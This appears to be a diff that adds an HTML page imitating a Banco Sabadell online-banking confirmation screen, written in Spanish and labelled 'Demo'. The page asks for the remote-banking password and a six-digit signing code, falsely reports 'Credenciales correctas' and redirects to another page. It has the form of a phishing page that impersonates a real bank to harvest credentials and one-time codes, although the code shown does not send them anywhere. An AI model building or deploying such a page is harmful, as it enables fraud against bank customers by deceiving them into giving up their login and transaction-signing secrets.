@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Confirmación — Demo</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --brand:#0b66ff; --text:#101828; --muted:#6b7280; --border:#e5e7eb; --bg:#fff;
+    --card:#ffffff; --shadow:0 10px 24px rgba(0,0,0,.06);
+    --ok:#16a34a; --ok-bg:#ecfdf5; --err:#b91c1c; --err-bg:#fef2f2;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0; font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif; background:#fafafa; color:var(--text)}
+
+  .topbar{height:56px; background:var(--brand); color:#fff; display:flex; align-items:center; padding:0 20px; font-weight:800}
+  .topbar .brand{display:flex; align-items:center; gap:10px}
+  .topbar .dot{
+    width:22px; height:22px; border-radius:999px; background:#fff; color:var(--brand);
+    display:grid; place-items:center; font-weight:900; font-size:13px;
+  }
+
+  .container{max-width:980px; margin:0 auto; padding:24px 20px}
+  .divider{border:0; border-top:1px solid #d1d5db; margin:12px 0 24px}
+
+  h2{font-size:28px; margin:0 0 10px}
+  label{display:block; font-size:12px; color:#475569; margin-bottom:6px}
+  input[type="password"]{
+    width:340px; max-width:100%;
+    height:40px; border:1px solid var(--border); border-radius:4px; padding:0 12px; outline:none;
+    font-size:14px;
+  }
+  input[type="password"]::placeholder{color:#a0a0a0}
+  .section{margin:26px 0}
+
+  .confirm-grid{
+    display:grid; grid-template-columns:1fr 1fr; gap:28px; align-items:flex-start;
+  }
+  @media (max-width:900px){ .confirm-grid{grid-template-columns:1fr} }
+
+  .code-slots{display:flex; gap:18px; margin:8px 0 12px}
+  .slot{
+    width:44px; height:48px; display:flex; align-items:flex-end; justify-content:center;
+    position:relative; font-size:26px; font-weight:900; color:#111827;
+  }
+  .slot::after{
+    content:""; position:absolute; left:0; right:0; bottom:6px; height:2px; background:#9aa4b2;
+  }
+  .slot .char{line-height:1; transform:translateY(-4px);}
+
+  .keypad{
+    width:280px; max-width:100%; display:grid; grid-template-columns:repeat(4,1fr); gap:10px;
+  }
+  .key{
+    height:44px; border:1px solid #c7d2fe; border-radius:6px; background:#fff; cursor:pointer;
+    display:flex; align-items:center; justify-content:center; font-weight:700; transition:.12s ease;
+    user-select:none;
+  }
+  .key:hover{ transform:translateY(-1px); box-shadow:var(--shadow) }
+  .key:active{ transform:scale(.98) }
+  .key--accent{ border-color:#fecaca; color:#b91c1c; }
+  .key--muted{ color:#475569; border-color:#cbd5e1; }
+
+  .actions{margin-top:26px; display:flex; gap:10px}
+  .btn{
+    height:42px; padding:0 18px; border-radius:8px; border:1px solid var(--border); background:#f3f4f6;
+    font-weight:800; cursor:pointer;
+  }
+  .btn.primary{ background:#0b66ff; color:#fff; border-color:#0b66ff; }
+  .btn:active{ transform:scale(.98) }
+
+  .notice{
+    margin-top:14px; padding:12px 14px; border-radius:10px; font-weight:700; display:none;
+  }
+  .notice.show{ display:block; animation:pop .2s ease-out }
+  .notice.ok{ background:var(--ok-bg); color:var(--ok); border:1px solid #bbf7d0; }
+  .notice.err{ background:var(--err-bg); color:var(--err); border:1px solid #fecaca; }
+  @keyframes pop { from { transform:scale(.98); opacity:.6 } to { transform:scale(1); opacity:1 } }
+</style>
+</head>
+<body>
+
+  <div class="topbar">
+    <div class="brand">
+      <div class="dot">B</div>
+      Sabadell
+    </div>
+  </div>
+
+  <div class="container">
+    <hr class="divider">
+
+    <div class="section">
+      <h2>Introduce tu contraseña de banca a distancia, por favor</h2>
+      <label for="pwd">Contraseña</label>
+      <input id="pwd" type="password" placeholder="Ej: 123456" autocomplete="current-password">
+    </div>
+
+    <div class="section">
+      <h2>Introduce la clave de confirmación, por favor.</h2>
+
+      <div class="confirm-grid">
+        <div>
+          <!-- Slots con • y subrayado (sin recuadro de números) -->
+          <div class="code-slots" id="slots" aria-live="polite" aria-label="Código de 6 dígitos"></div>
+
+          <!-- Aviso en pantalla -->
+          <div id="notice" class="notice" role="status" aria-live="polite"></div>
+
+          <div class="actions">
+            <button class="btn" id="clearBtn" type="button">Limpiar</button>
+            <button class="btn primary" id="signBtn" type="button">Firmar</button>
+          </div>
+        </div>
+
+        <!-- Teclado -->
+        <div>
+          <div class="keypad" id="keypad">
+            <div class="key">0</div>
+            <div class="key">1</div>
+            <div class="key">2</div>
+            <div class="key">3</div>
+            <div class="key">4</div>
+            <div class="key">5</div>
+            <div class="key">6</div>
+            <div class="key">7</div>
+            <div class="key">8</div>
+            <div class="key">9</div>
+            <div class="key key--muted" data-action="back">⌫</div>
+            <div class="key key--accent" data-action="clear">C</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+<script>
+  // ===== Config =====
+  const MAX_LEN = 6;
+  const EXPECTED_CODE = null; // Si quieres exigir uno, p.ej. "123456"
+
+  // ===== Estado =====
+  let code = "";
+
+  // ===== Elementos =====
+  const slotsWrap = document.getElementById('slots');
+  const keypad    = document.getElementById('keypad');
+  const notice    = document.getElementById('notice');
+  const clearBtn  = document.getElementById('clearBtn');
+  const signBtn   = document.getElementById('signBtn');
+
+  // Render de slots
+  function renderSlots(){
+    slotsWrap.innerHTML = "";
+    for(let i=0;i<MAX_LEN;i++){
+      const div = document.createElement('div');
+      div.className = 'slot';
+      const span = document.createElement('span');
+      span.className = 'char';
+      span.textContent = code[i] ? '•' : '';
+      div.appendChild(span);
+      slotsWrap.appendChild(div);
+    }
+  }
+
+  function showNotice(msg, type='ok'){
+    notice.className = `notice show ${type === 'ok' ? 'ok' : 'err'}`;
+    notice.textContent = msg;
+  }
+  function clearNotice(){
+    notice.className = 'notice';
+    notice.textContent = '';
+  }
+
+  function pushDigit(d){
+    if(code.length >= MAX_LEN) return;
+    code += String(d);
+    renderSlots(); clearNotice();
+  }
+  function backspace(){
+    if(!code.length) return;
+    code = code.slice(0,-1);
+    renderSlots(); clearNotice();
+  }
+  function clearAll(){
+    code = "";
+    renderSlots(); clearNotice();
+  }
+
+  // Click en teclado
+  keypad.addEventListener('click', (e)=>{
+    const key = e.target.closest('.key');
+    if(!key) return;
+    const action = key.dataset.action;
+    if(action === 'back') { backspace(); return; }
+    if(action === 'clear'){ clearAll(); return; }
+    const val = key.textContent.trim();
+    if(/^\d$/.test(val)) pushDigit(val);
+  });
+
+  // Teclado físico
+  document.addEventListener('keydown', (e)=>{
+    if(e.key >= '0' && e.key <= '9'){ pushDigit(e.key); }
+    else if(e.key === 'Backspace'){ backspace(); }
+    else if(e.key === 'Escape'){ clearAll(); }
+  });
+
+  // Botones
+  clearBtn.addEventListener('click', clearAll);
+  signBtn.addEventListener('click', ()=>{
+    if(code.length !== MAX_LEN){
+      showNotice(`La clave debe tener ${MAX_LEN} dígitos.`, 'err');
+      return;
+    }
+    if(EXPECTED_CODE && code !== EXPECTED_CODE){
+      showNotice('Código incorrecto. Inténtalo de nuevo.', 'err');
+      return;
+    }
+
+    localStorage.setItem('AI_Added', 'true'); // opcional
+
+    showNotice('Credenciales correctas. Redirigiendo…', 'ok');
+    setTimeout(()=>{ window.location.assign('/clear-pay.html'); }, 1200);
+  });
+
+  // Init
+  renderSlots();
+</script>
+</body>
+</html>
